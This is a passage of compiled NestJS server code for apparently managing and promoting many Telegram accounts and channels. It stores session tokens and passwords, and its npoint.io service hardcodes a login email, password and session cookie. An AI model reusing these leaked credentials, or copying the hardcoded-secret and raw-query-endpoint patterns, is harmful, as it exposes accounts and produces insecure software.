    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Repl link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Promotion Repl link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Clientname of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "clientName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Deployment key URL' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Main account of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Product associated with the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Promote mobile numbers of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.map((v) => v?.trim())),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.ArrayNotEmpty)({ message: 'Promote mobile numbers must not be empty if provided' }),
    (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { each: true, message: 'Invalid phone number format in promoteMobile' }),
    __metadata("design:type", Array)
], SearchClientDto.prototype, "promoteMobile", void 0);


/***/ }),

/***/ "./src/components/clients/dto/update-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/update-client.dto.ts ***!
  \*********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_client_dto_1 = __webpack_require__(/*! ./create-client.dto */ "./src/components/clients/dto/create-client.dto.ts");
class UpdateClientDto extends (0, swagger_1.PartialType)(create_client_dto_1.CreateClientDto) {
}
exports.UpdateClientDto = UpdateClientDto;


/***/ }),

/***/ "./src/components/clients/schemas/client.schema.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/schemas/client.schema.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientSchema = exports.Client = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Client = class Client {
};
exports.Client = Client;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'mobile number of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==', description: 'Session token' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Main account of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['916265240911'], description: 'Promote mobile number of the user' }),
    (0, mongoose_1.Prop)({ required: false, type: [String] }),
    __metadata("design:type", Array)
], Client.prototype, "promoteMobile", void 0);
exports.Client = Client = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Client);
exports.ClientSchema = mongoose_1.SchemaFactory.createForClass(Client);


/***/ }),

/***/ "./src/components/n-point/npoint.controller.ts":
/*!*****************************************************!*\
  !*** ./src/components/n-point/npoint.controller.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const npoint_service_1 = __webpack_require__(/*! ./npoint.service */ "./src/components/n-point/npoint.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let NpointController = class NpointController {
    constructor(npointService) {
        this.npointService = npointService;
    }
    async fetchDocument(id) {
        try {
            return await this.npointService.fetchDocument(id);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async postDocument(document) {
        try {
            return await this.npointService.postDocument(document);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async fetchAllDocuments() {
        try {
            return await this.npointService.fetchAllDocuments();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async updateDocument(id, updatedDocument) {
        try {
            return await this.npointService.updateDocument(id, updatedDocument);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
};
exports.NpointController = NpointController;
__decorate([
    (0, common_1.Get)('documents/:id'),
    (0, swagger_1.ApiOperation)({ summary: 'Fetch a document by ID' }),
    (0, swagger_1.ApiParam)({ name: 'id', description: 'The ID of the document to fetch' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Document fetched successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document not found' }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "fetchDocument", null);
__decorate([
    (0, common_1.Post)('documents'),
    (0, swagger_1.ApiOperation)({ summary: 'Post a new document' }),
    (0, swagger_1.ApiBody)({
        description: 'The document to post',
        schema: {
            example: {
                title: 'My Document',
                content: 'This is the content of the document.',
            },
        },
    }),
    (0, swagger_1.ApiResponse)({
        status: 201,
        description: 'Document posted successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "postDocument", null);
__decorate([
    (0, common_1.Get)('documents'),
    (0, swagger_1.ApiOperation)({ summary: 'Fetch all documents' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'List of all documents fetched successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal server error' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "fetchAllDocuments", null);
__decorate([
    (0, common_1.Put)('documents/:id'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a document by ID' }),
    (0, swagger_1.ApiParam)({ name: 'id', description: 'The ID of the document to update' }),
    (0, swagger_1.ApiBody)({
        description: 'The updated document',
        schema: {
            example: {
                title: 'Updated Document',
                content: 'This is the updated content of the document.',
            },
        },
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Document updated successfully',
    }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document not found' }),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], NpointController.prototype, "updateDocument", null);
exports.NpointController = NpointController = __decorate([
    (0, swagger_1.ApiTags)('NPoint API'),
    (0, common_1.Controller)('npoint'),
    __metadata("design:paramtypes", [npoint_service_1.NpointService])
], NpointController);


/***/ }),

/***/ "./src/components/n-point/npoint.module.ts":
/*!*************************************************!*\
  !*** ./src/components/n-point/npoint.module.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const npoint_service_1 = __webpack_require__(/*! ./npoint.service */ "./src/components/n-point/npoint.service.ts");
const npoint_controller_1 = __webpack_require__(/*! ./npoint.controller */ "./src/components/n-point/npoint.controller.ts");
let NpointModule = class NpointModule {
};
exports.NpointModule = NpointModule;
exports.NpointModule = NpointModule = __decorate([
    (0, common_1.Module)({
        controllers: [npoint_controller_1.NpointController],
        providers: [npoint_service_1.NpointService],
        exports: [npoint_service_1.NpointService]
    })
], NpointModule);


/***/ }),

/***/ "./src/components/n-point/npoint.service.ts":
/*!**************************************************!*\
  !*** ./src/components/n-point/npoint.service.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var NpointService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.NpointService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
let NpointService = NpointService_1 = class NpointService {
    constructor() {
        this.logger = new common_1.Logger(NpointService_1.name);
        this.csrfToken = null;
        this.cookie = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';
        this.baseUrl = 'https://www.npoint.io';
        this.signInUrl = 'https://www.npoint.io/users/sign_in';
    }
    async fetchCsrfToken() {
        this.logger.debug('Fetching CSRF token...');
        try {
            let data = JSON.stringify({
                "user": {
                    "email": "dodieajt@gmail.com",
                    "password": "Ajtdmwajt1@"
                }
            });
            let config = {
                method: 'post',
                maxBodyLength: Infinity,
                url: this.signInUrl,
                headers: {
                    'Content-Type': 'application/json',
                    'Cookie': this.cookie
                },
                data: data
            };
            const response = await axios_1.default.request(config);
            console.log("Cookie:", response.headers['set-cookie'][0]);
            this.cookie = response.headers['set-cookie'][0];
            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);
            if (!this.csrfToken) {
                throw new Error('CSRF token not found in the sign-in response.');
            }
            this.logger.debug('CSRF token fetched successfully.');
            return this.csrfToken;
        }
        catch (error) {
            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);
            throw new Error(`Failed to fetch CSRF token: ${error.message}`);
        }
    }
    async ensureCsrfToken() {
        if (!this.csrfToken) {
            await this.fetchCsrfToken();
        }
    }
    async fetchDocument(documentId) {
        this.logger.debug(`Fetching document with ID: ${documentId}`);
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.get(`${this.baseUrl}/documents/${documentId}`, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);
            throw new Error(`Failed to fetch document: ${error.message}`);
        }
    }
    async postDocument(document) {
        this.logger.debug('Posting a new document...');
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.post(`${this.baseUrl}/documents`, { "generate_contents": true }, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);
            await this.updateDocument(response.data.token, document);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to post document: ${error.message}`);
            throw new Error(`Failed to post document: ${error.message}`);
        }
    }
    async updateDocument(documentId, updatedDocument) {
        this.logger.debug(`Updating document with ID: ${documentId}`);
        await this.ensureCsrfToken();
        const body = {
            "contents": JSON.stringify(updatedDocument),
            "original_contents": JSON.stringify(updatedDocument),
            "schema": null,
            "original_schema": ""
        };
        try {
            const response = await axios_1.default.put(`${this.baseUrl}/documents/${documentId}`, body, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);
            throw new Error(`Failed to update document: ${error.message}`);
        }
    }
    async fetchAllDocuments() {
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.get(`${this.baseUrl}/documents`, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            return response.data;
        }
        catch (error) {
            throw new Error(`Failed to fetch all documents: ${error.message}`);
        }
    }
    async fetchCsrfTokenFromHtml(data) {
        try {
            const csrfTokenMatch = data.match(/<meta name="csrf-token" content="([^"]+)"/);
            if (!csrfTokenMatch || !csrfTokenMatch[1]) {
                throw new Error('CSRF token not found in the HTML response.');
            }
            const csrfToken = csrfTokenMatch[1];
            console.log('CSRF Token:', csrfToken);
            return csrfToken;
        }
        catch (error) {
            console.error('Error fetching CSRF token:', error);
        }
    }
};
exports.NpointService = NpointService;
exports.NpointService = NpointService = NpointService_1 = __decorate([
    (0, common_1.Injectable)()
], NpointService);


/***/ }),

/***/ "./src/components/promote-clients/dto/create-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/create-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreatePromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreatePromoteClientDto {
}
exports.CreatePromoteClientDto = CreatePromoteClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Date of the session',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'lastActive identifier',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], CreatePromoteClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/promote-clients/dto/search-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/search-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchPromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchPromoteClientDto {
}
exports.SearchPromoteClientDto = SearchPromoteClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'availableDate of the promoteClient',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchPromoteClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/promote-clients/dto/update-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/update-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdatePromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_promote_client_dto_1 = __webpack_require__(/*! ./create-promote-client.dto */ "./src/components/promote-clients/dto/create-promote-client.dto.ts");
class UpdatePromoteClientDto extends (0, swagger_1.PartialType)(create_promote_client_dto_1.CreatePromoteClientDto) {
}
exports.UpdatePromoteClientDto = UpdatePromoteClientDto;


/***/ }),

/***/ "./src/components/promote-clients/promote-client.controller.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.controller.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_client_service_1 = __webpack_require__(/*! ./promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const create_promote_client_dto_1 = __webpack_require__(/*! ./dto/create-promote-client.dto */ "./src/components/promote-clients/dto/create-promote-client.dto.ts");
const search_promote_client_dto_1 = __webpack_require__(/*! ./dto/search-promote-client.dto */ "./src/components/promote-clients/dto/search-promote-client.dto.ts");
const update_promote_client_dto_1 = __webpack_require__(/*! ./dto/update-promote-client.dto */ "./src/components/promote-clients/dto/update-promote-client.dto.ts");
let PromoteClientController = class PromoteClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        return this.clientService.create(createClientDto);
    }
    async search(query) {
        return this.clientService.search(query);
    }
    async joinChannelsforPromoteClients() {
        return this.clientService.joinchannelForPromoteClients();
    }
    async checkpromoteClients() {
        this.clientService.checkPromoteClients();
        return "initiated Checking";
    }
    async addNewUserstoPromoteClients(body) {
        this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds);
        return "initiated Checking";
    }
    async findAll() {
        return this.clientService.findAll();
    }
    async setAsPromoteClient(mobile) {
        return await this.clientService.setAsPromoteClient(mobile);
    }
    async findOne(mobile) {
        return this.clientService.findOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.clientService.update(mobile, updateClientDto);
    }
    async createdOrupdate(mobile, updateClientDto) {
        return this.clientService.createOrUpdate(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.clientService.remove(mobile);
    }
    async executeQuery(query) {
        try {
            return await this.clientService.executeQuery(query);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.PromoteClientController = PromoteClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_promote_client_dto_1.CreatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_promote_client_dto_1.SearchPromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('joinChannelsForPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Join Channels for PromoteClients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "joinChannelsforPromoteClients", null);
__decorate([
    (0, common_1.Get)('checkPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Check Promote Clients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "checkpromoteClients", null);
__decorate([
    (0, common_1.Post)('addNewUserstoPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Add New Users to Promote Clients' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
